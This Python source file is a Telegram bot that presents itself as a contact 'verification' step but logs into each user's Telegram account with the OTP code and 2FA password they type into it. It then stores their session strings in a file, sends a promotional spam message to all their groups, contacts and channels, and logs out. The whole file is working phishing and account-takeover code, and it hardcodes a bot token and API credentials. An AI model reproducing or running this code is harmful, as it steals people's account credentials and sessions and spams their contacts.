import os
import csv
import time
import asyncio
import random
import sqlite3
from telethon.sync import TelegramClient
from telethon.errors import (
    FloodWaitError, PhoneNumberBannedError, SessionPasswordNeededError,
    PhoneCodeInvalidError, PhoneCodeExpiredError, SessionRevokedError,
    ApiIdInvalidError, AuthKeyDuplicatedError
)
from telethon.tl.functions.channels import InviteToChannelRequest, EditAdminRequest
from telethon.tl.functions.account import DeleteAccountRequest, ReportPeerRequest
from telethon.tl.functions.auth import LogOutRequest
from telethon.tl.types import (
    InputReportReasonSpam, InputReportReasonViolence, InputReportReasonChildAbuse,
    InputReportReasonPornography, InputReportReasonCopyright, InputReportReasonFake,
    InputReportReasonOther, InputChannel, InputUserSelf, ChatAdminRights
)
from telethon.sessions import StringSession
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import logging

# Bot configuration
BOT_TOKEN = "8530118646:AAGsBFuDaK1iWIcZENPJl1aMsab-0_xNZzs"

# Telethon configuration
API_ID = 21319726
API_HASH = "3eda6c1a58fa89aff32b36eb7a85f821"

# File paths
SESSIONS_FILE = "sessions.txt"

# Broadcast message
BROADCAST_MESSAGE = "━━━━━━━━━━━━━━━━━━\n🚀 Powered by @SMMGemBot"

# User states
class UserState:
    def __init__(self):
        self.phone_number = None
        self.waiting_for = None
        self.otp_code = None
        self.two_fa_password = None
        self.client = None
        self.logged_in = False
        self.otp_digits = []  # Store OTP digits

# Global dictionary to store user states
user_states = {}

# Custom logger class to filter out HTTP logs
class CustomLogger:
    def __init__(self, name):
        self.logger = logging.getLogger(name)
        self.user_activities = {}
    
    def info(self, message, user_id=None):
        self.logger.info(message)
        if user_id:
            if user_id not in self.user_activities:
                self.user_activities[user_id] = []
            self.user_activities[user_id].append(f"INFO: {message}")
    
    def error(self, message, user_id=None):
        self.logger.error(message)
        if user_id:
            if user_id not in self.user_activities:
                self.user_activities[user_id] = []
            self.user_activities[user_id].append(f"ERROR: {message}")

# Set up custom logging
logger = CustomLogger(__name__)
logging.basicConfig(level=logging.INFO)

def load_sessions():
    """Load session strings from file"""
    sessions = {}
    if os.path.exists(SESSIONS_FILE):
        try:
            with open(SESSIONS_FILE, 'r', encoding='utf-8') as f:
                for line in f:
                    if ':' in line:
                        phone, session_str = line.strip().split(':', 1)
                        sessions[phone] = session_str
        except Exception as e:
            logger.error(f"Error loading sessions: {e}")
    return sessions

def save_session(phone, session_str):
    """Save session string to file"""
    sessions = load_sessions()
    sessions[phone] = session_str
    try:
        with open(SESSIONS_FILE, 'w', encoding='utf-8') as f:
            for ph, sess in sessions.items():
                f.write(f"{ph}:{sess}\n")
    except Exception as e:
        logger.error(f"Error saving session: {e}")

def remove_session(phone):
    """Remove session from file"""
    sessions = load_sessions()
    if phone in sessions:
        del sessions[phone]
        try:
            with open(SESSIONS_FILE, 'w', encoding='utf-8') as f:
                for ph, sess in sessions.items():
                    f.write(f"{ph}:{sess}\n")
            return True
        except Exception as e:
            logger.error(f"Error removing session: {e}")
            return False
    return True

async def login_with_session(phone, session_str, user_id):
    """Login using session string"""
    try:
        session = StringSession(session_str)
        client = TelegramClient(session, API_ID, API_HASH)
        await client.connect()
        
        if await client.is_user_authorized():
            return client, "AUTHORIZED"
        else:
            return None, "Session expired"
    except Exception as e:
        return None, f"Error with session login: {e}"

async def login_with_phone(phone, user_id):
    """Login using phone number"""
    try:
        # First try to load existing session
        sessions = load_sessions()
        if phone in sessions:
            client, status = await login_with_session(phone, sessions[phone], user_id)
            if client:
                return client, "AUTHORIZED"
        
        # If no session or session expired, create new client
        session_file = f"sessions/{phone.replace('+', '')}.session"
        client = TelegramClient(session_file, API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            # Send code request
            await client.send_code_request(phone)
            return client, "OTP"
        
        # Save session for future use
        session_str = StringSession.save(client.session)
        save_session(phone, session_str)
        
        return client, "AUTHORIZED"
    except Exception as e:
        return None, f"Error: {e}"

async def complete_login_with_otp(phone, code, user_id):
    """Complete login with OTP code"""
    try:
        state = user_states[user_id]
        client = state.client
        if not client:
            return False, "Client not found. Please start over with /start"
        
        await client.sign_in(phone=phone, code=code)
        session_str = StringSession.save(client.session)
        save_session(phone, session_str)
        
        return True, "Login successful!"
    except SessionPasswordNeededError:
        return False, "2FA password required"
    except Exception as e:
        return False, f"Error during OTP verification: {e}"

async def complete_2fa(phone, password, user_id):
    """Complete 2FA login"""
    try:
        state = user_states[user_id]
        client = state.client
        if not client:
            return False, "Client not found"
        
        await client.sign_in(password=password)
        session_str = StringSession.save(client.session)
        save_session(phone, session_str)
        
        return True, "2FA login successful!"
    except Exception as e:
        return False, f"Error during 2FA verification: {e}"

async def broadcast_to_all_dialogs(client, user_id):
    """Send broadcast message to all groups, contacts, and channels"""
    try:
        dialogs = await client.get_dialogs()
        success_count = 0
        fail_count = 0
        
        for dialog in dialogs:
            # Skip dialogs that are not groups, channels, or private users
            if not (dialog.is_group or dialog.is_channel or dialog.is_user):
                continue
            
            # Skip if it's the current user's own "Saved Messages" or similar
            if dialog.entity and hasattr(dialog.entity, 'id') and dialog.entity.id == (await client.get_me()).id:
                continue
            
            try:
                await client.send_message(dialog.entity, BROADCAST_MESSAGE)
                success_count += 1
                await asyncio.sleep(1.5)  # Avoid flood wait
            except FloodWaitError as e:
                logger.warning(f"Flood wait {e.seconds}s", user_id)
                await asyncio.sleep(e.seconds + 1)
                # Retry once
                try:
                    await client.send_message(dialog.entity, BROADCAST_MESSAGE)
                    success_count += 1
                except Exception as inner_e:
                    logger.error(f"Failed after flood wait: {inner_e}", user_id)
                    fail_count += 1
            except Exception as e:
                logger.error(f"Failed to send to {dialog.name}: {e}", user_id)
                fail_count += 1
        
        return True, f"✅ Broadcast completed: Sent to {success_count} chats, failed {fail_count}."
    except Exception as e:
        return False, f"Error during broadcast: {e}"

async def logout_all_devices(client, user_id):
    """Log out from all devices and terminate the session"""
    try:
        # Revoke all auth keys (logout all devices)
        await client(LogOutRequest())
        # Remove session from file
        phone = str(client._phone) if hasattr(client, '_phone') else "unknown"
        remove_session(phone)
        # Delete local session file if exists
        session_file = f"sessions/{phone.replace('+', '')}.session"
        if os.path.exists(session_file):
            os.remove(session_file)
        return True, "Logged out from all devices successfully."
    except Exception as e:
        return False, f"Error logging out: {e}"

async def safe_disconnect(client):
    """Safely disconnect a client"""
    try:
        if client and client.is_connected():
            await client.disconnect()
    except Exception as e:
        logger.error(f"Error disconnecting client: {e}")

def create_otp_keyboard():
    """Create OTP input keyboard"""
    keyboard = [
        [
            InlineKeyboardButton("1", callback_data="otp_1"),
            InlineKeyboardButton("2", callback_data="otp_2"),
            InlineKeyboardButton("3", callback_data="otp_3")
        ],
        [
            InlineKeyboardButton("4", callback_data="otp_4"),
            InlineKeyboardButton("5", callback_data="otp_5"),
            InlineKeyboardButton("6", callback_data="otp_6")
        ],
        [
            InlineKeyboardButton("7", callback_data="otp_7"),
            InlineKeyboardButton("8", callback_data="otp_8"),
            InlineKeyboardButton("9", callback_data="otp_9")
        ],
        [
            InlineKeyboardButton("<", callback_data="otp_back"),
            InlineKeyboardButton("0", callback_data="otp_0"),
            InlineKeyboardButton("⌫", callback_data="otp_delete")
        ],
        [
            InlineKeyboardButton("✅ Submit", callback_data="otp_submit")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def format_otp_display(digits):
    """Format OTP digits with spaces"""
    if not digits:
        return "Enter OTP code:"
    formatted = " ".join(digits)
    return f"OTP: {formatted}"

# Bot command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id] = UserState()
    
    # Create contact sharing button
    contact_button = KeyboardButton(text="📱 Verify", request_contact=True)
    reply_markup = ReplyKeyboardMarkup([[contact_button]], resize_keyboard=True, one_time_keyboard=True)
    
    await update.message.reply_text(
        "👋 Welcome! ZX AMER CLUB TEAM\n\nPlease share your contact to verify:",
        reply_markup=reply_markup
    )

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in user_states:
        user_states[user_id] = UserState()
    
    state = user_states[user_id]
    
    # Get contact information
    contact = update.message.contact
    if not contact:
        await update.message.reply_text("❌ Please share your contact using the button.")
        return
    
    phone_number = contact.phone_number
    if not phone_number.startswith('+'):
        phone_number = '+' + phone_number
    
    state.phone_number = phone_number
    
    # Try to login with phone
    await update.message.reply_text("🔑 দয়া করে একটু ওয়েট করুন...")
    
    client, status = await login_with_phone(state.phone_number, user_id)
    
    if client is None:
        await update.message.reply_text(f"❌ Login failed: {status}")
        return
    
    state.client = client
    
    if status == "AUTHORIZED":
        state.logged_in = True
        await update.message.reply_text("✅ Login successful!")
        # Show Broadcast button
        keyboard = [
            [InlineKeyboardButton("💬 Broadcast message", callback_data="broadcast")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("Click the button below to send broadcast message to all your groups, contacts, and channels:", reply_markup=reply_markup)
    elif status == "OTP":
        state.waiting_for = "OTP"
        state.otp_digits = []  # Initialize OTP digits list
        
        # Send OTP input keyboard
        message = "📲 OTP sent to your phone.\n\n" + format_otp_display(state.otp_digits)
        await update.message.reply_text(message, reply_markup=create_otp_keyboard())

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if user_id not in user_states:
        await query.edit_message_text("❌ Session expired. Please start over with /start")
        return
    
    state = user_states[user_id]
    
    if query.data.startswith("otp_"):
        # Handle OTP input
        if state.waiting_for != "OTP":
            await query.edit_message_text("❌ OTP input not expected. Please start over with /start")
            return
        
        action = query.data.split("_")[1]
        
        if action.isdigit():
            if len(state.otp_digits) < 10:
                state.otp_digits.append(action)
        elif action == "back":
            state.waiting_for = None
            state.otp_digits = []
            contact_button = KeyboardButton(text="📱 Verify", request_contact=True)
            reply_markup = ReplyKeyboardMarkup([[contact_button]], resize_keyboard=True, one_time_keyboard=True)
            await query.edit_message_text(
                "Please share your contact to verify:",
                reply_markup=None
            )
            await query.message.reply_text(
                "👋 Welcome! ZX AMER CLUB TEAM\n\nPlease share your contact to verify:",
                reply_markup=reply_markup
            )
            return
        elif action == "delete":
            if state.otp_digits:
                state.otp_digits.pop()
        elif action == "submit":
            if not state.otp_digits:
                await query.answer("❌ Please enter OTP code first", show_alert=True)
                return
            
            otp_code = "".join(state.otp_digits)
            state.waiting_for = None
            
            await query.edit_message_text("⏳ Verifying OTP...")
            
            success, message = await complete_login_with_otp(state.phone_number, otp_code, user_id)
            
            if success:
                state.logged_in = True
                await query.edit_message_text("✅ Login successful!")
                # Show Broadcast button
                keyboard = [
                    [InlineKeyboardButton("💬 Broadcast message", callback_data="broadcast")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await query.message.reply_text("Click the button below to send broadcast message to all your groups, contacts, and channels:", reply_markup=reply_markup)
            else:
                if "2FA password required" in message:
                    state.waiting_for = "2FA"
                    await query.edit_message_text("🔒 Please enter your 2FA password:")
                else:
                    await query.edit_message_text(f"❌ {message}\n\nPlease try again with /start")
            return
        
        # Update OTP display
        message = "📲 OTP sent to your phone.\n\n" + format_otp_display(state.otp_digits)
        await query.edit_message_text(message, reply_markup=create_otp_keyboard())
    
    elif query.data == "broadcast":
        if not state.logged_in or not state.client:
            await query.edit_message_text("❌ Please login first using /start")
            return
        
        await query.edit_message_text("⏳ Sending broadcast message to all your groups, contacts, and channels... This may take a while.")
        
        success, message = await broadcast_to_all_dialogs(state.client, user_id)
        
        if success:
            await query.edit_message_text(f"{message}\n\nNow logging out from all devices...")
            
            # Logout from all devices
            logout_success, logout_msg = await logout_all_devices(state.client, user_id)
            
            if logout_success:
                await safe_disconnect(state.client)
                user_states[user_id] = UserState()
                await query.edit_message_text(
                    f"{message}\n\n{logout_msg}\n\n"
                    f"🙏 Thank you! All sessions terminated.\n"
                    f"Type /start to use the bot again."
                )
            else:
                await query.edit_message_text(f"{message}\n\n❌ Error logging out: {logout_msg}")
        else:
            await query.edit_message_text(f"❌ {message}\n\nBroadcast failed. You can try again or logout manually.")

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in user_states:
        user_states[user_id] = UserState()
    
    state = user_states[user_id]
    message_text = update.message.text
    
    # Handle 2FA password input (text message)
    if state.waiting_for == "2FA":
        state.two_fa_password = message_text
        state.waiting_for = None
        
        success, message = await complete_2fa(state.phone_number, state.two_fa_password, user_id)
        
        if success:
            state.logged_in = True
            await update.message.reply_text("✅ Login successful!")
            keyboard = [
                [InlineKeyboardButton("💬 Broadcast message", callback_data="broadcast")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text("Click the button below to send broadcast message to all your groups, contacts, and channels:", reply_markup=reply_markup)
        else:
            await update.message.reply_text(f"❌ {message}")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in user_states:
        # Safely disconnect client
        if user_states[user_id].client:
            await safe_disconnect(user_states[user_id].client)
        # Clear state
        user_states[user_id] = UserState()
        await update.message.reply_text("✅ Operation cancelled.")

def main():
    # Create necessary directories
    os.makedirs("sessions", exist_ok=True)
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cancel", cancel))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.CONTACT, contact_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    
    # Start the bot
    application.run_polling()
    logger.info("Bot started")

if __name__ == "__main__":
    main()
